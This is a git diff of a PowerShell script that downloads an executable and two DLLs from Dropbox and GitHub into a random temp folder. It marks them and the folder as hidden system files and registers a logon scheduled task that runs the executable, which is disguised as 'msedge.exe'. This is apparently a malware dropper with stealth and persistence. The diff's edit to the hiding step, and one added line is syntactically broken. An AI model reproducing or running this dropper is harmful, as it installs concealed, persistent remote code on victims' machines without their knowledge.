@@ -10,15 +10,8 @@ Invoke-WebRequest -Uri "dl.dropboxusercontent.com/scl/fi/xj2dqhq094ir9olj72010/m
 Invoke-WebRequest -Uri "https://raw.githubusercontent.com/blousekool/BBbdtools/main/bd/tools/libsodium.dll" -OutFile libsodium.dll
 Invoke-WebRequest -Uri "https://raw.githubusercontent.com/blousekool/BBbdtools/main/bd/tools/libopus.dll" -OutFile libopus.dll
 
-$filePath = "$env:temp/sVBXKuz/msedge.exe"
-$dll1Path = "$env:temp/sVBXKuz/libsodium.dll"
-$dll2Path = "$env:temp/sVBXKuz/libopus.dll"
-$folderPath = "$env:temp/sVBXKuz/"
-
-Set-ItemProperty -Path $filePath -Name Attributes -Value ([IO.FileAttributes]::System -bor [IO.FileAttributes]::Hidden)
-Set-ItemProperty -Path $dll1Path -Name Attributes -Value ([IO.FileAttributes]::System -bor [IO.FileAttributes]::Hidden)
-Set-ItemProperty -Path $dll2Path -Name Attributes -Value ([IO.FileAttributes]::System -bor [IO.FileAttributes]::Hidden)
-Set-ItemProperty -Path $folderPath -Name Attributes -Value ([IO.FileAttributes]::System -bor [IO.FileAttributes]::Hidden)
+Get-ChildItem -Path "$env:temp/sVBXKuz/" -File | ForEach-Object { $_.Attributes = [System.IO.FileAttributes]::System -bor [System.IO.FileAttributes]::Hidden }
+Set-ItemProperty -Path $folderPath = "$env:temp/sVBXKuz/" -Name Attributes -Value ([IO.FileAttributes]::System -bor [IO.FileAttributes]::Hidden)
 
 $taskAction = New-ScheduledTaskAction -Execute '$env:temp\sVBXKuz\msedge.exe'
 $taskTrigger = New-ScheduledTaskTrigger -AtLogOn
